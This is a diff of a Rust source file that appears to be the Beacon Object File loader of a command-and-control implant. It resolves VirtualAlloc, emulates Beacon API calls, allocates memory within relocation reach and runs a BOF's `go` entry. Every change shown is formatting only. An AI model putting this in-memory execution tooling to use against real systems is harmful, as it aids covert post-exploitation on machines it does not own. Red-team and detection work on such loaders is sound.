@@ -50,10 +50,8 @@ const PAGE_SIZE: usize = 0x1000;
 /// `IMAGE_SCN_MEM_EXECUTE` — marks a code section (.text).
 const SCN_MEM_EXECUTE: u32 = 0x2000_0000;
 
-type VirtualAllocFn =
-    unsafe extern "system" fn(*mut c_void, usize, u32, u32) -> *mut c_void;
-type VirtualProtectFn =
-    unsafe extern "system" fn(*mut c_void, usize, u32, *mut u32) -> i32;
+type VirtualAllocFn = unsafe extern "system" fn(*mut c_void, usize, u32, u32) -> *mut c_void;
+type VirtualProtectFn = unsafe extern "system" fn(*mut c_void, usize, u32, *mut u32) -> i32;
 
 unsafe fn virtual_alloc() -> Option<VirtualAllocFn> {
     let a = crate::resolve::export_addr(b"kernel32.dll", b"VirtualAlloc")?;
@@ -299,7 +297,14 @@ pub unsafe extern "C" fn BeaconPrintf(
     if typ == CALLBACK_ERROR {
         out_push_str("[error] ");
     }
-    let va = VaArgs { a1, a2, a3, a4, a5, a6 };
+    let va = VaArgs {
+        a1,
+        a2,
+        a3,
+        a4,
+        a5,
+        a6,
+    };
     format_into(fmt_bytes, &va);
     out_push(b"\n");
 }
@@ -327,11 +332,7 @@ pub struct DataParseState {
 /// `void BeaconDataParse(datap *parser, char *buffer, int size)`.
 /// If `buffer` is NULL, default to the loader-provided args blob.
 #[no_mangle]
-pub unsafe extern "C" fn BeaconDataParse(
-    d: *mut DataParseState,
-    buffer: *const u8,
-    size: i32,
-) {
+pub unsafe extern "C" fn BeaconDataParse(d: *mut DataParseState, buffer: *const u8, size: i32) {
     if d.is_null() {
         return;
     }
@@ -464,7 +465,11 @@ pub unsafe extern "C" fn BeaconGetSpawnTo(_x86: i32) -> *mut u8 {
     const TEMPLATE: &[u8; 28] = b"C:\\Windows\\System32\\cmd.exe\0";
     // SAFETY: single-threaded (beacon loop); SPAWN is only touched here.
     unsafe {
-        core::ptr::copy_nonoverlapping(TEMPLATE.as_ptr(), core::ptr::addr_of_mut!(SPAWN).cast::<u8>(), 28);
+        core::ptr::copy_nonoverlapping(
+            TEMPLATE.as_ptr(),
+            core::ptr::addr_of_mut!(SPAWN).cast::<u8>(),
+            28,
+        );
         core::ptr::addr_of_mut!(SPAWN).cast::<u8>()
     }
 }
@@ -582,20 +587,21 @@ fn beacon_api_addr(name: &str) -> Option<u64> {
 ///
 /// # Safety
 /// `alloc` must be the resolved kernel32 VirtualAlloc.
-unsafe fn alloc_near(
-    alloc: VirtualAllocFn,
-    anchor: usize,
-    sz: usize,
-) -> *mut c_void {
+unsafe fn alloc_near(alloc: VirtualAllocFn, anchor: usize, sz: usize) -> *mut c_void {
     const PAGE: usize = 0x1000;
     const STEP: usize = 1 << 20; // 1 MiB probe stride
     const WINDOW: usize = (2u64 << 30) as usize; // 2 GiB REL32 reach
-    // Start probing just below the anchor, walking down.
+                                                 // Start probing just below the anchor, walking down.
     let mut hint = (anchor & !(PAGE - 1)).saturating_sub(STEP);
     let floor = anchor.saturating_sub(WINDOW);
     let mut tries = 0;
     while hint > floor && tries < 64 {
-        let p = alloc(hint as *mut c_void, sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        let p = alloc(
+            hint as *mut c_void,
+            sz,
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_READWRITE,
+        );
         if !p.is_null() {
             return p;
         }
@@ -604,7 +610,12 @@ unsafe fn alloc_near(
     }
     // Fall back to the kernel's choice (REL32 may overflow, but at least we
     // return a region rather than failing outright).
-    alloc(ptr::null_mut(), sz, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
+    alloc(
+        ptr::null_mut(),
+        sz,
+        MEM_COMMIT | MEM_RESERVE,
+        PAGE_READWRITE,
+    )
 }
 
 // ============================================================================
@@ -749,8 +760,7 @@ pub fn run(name: &str, args: &[String], blob: &[u8]) -> Response {
     if entry_sym.section_number < 1 {
         return Response::Err(String::from("BOF entry `go` is external/undefined"));
     }
-    let entry_addr =
-        bases[(entry_sym.section_number - 1) as usize] + entry_sym.value as u64;
+    let entry_addr = bases[(entry_sym.section_number - 1) as usize] + entry_sym.value as u64;
 
     // 6. Set up capture + args, call go(), capture output.
     let args_blob = pack_args(args);
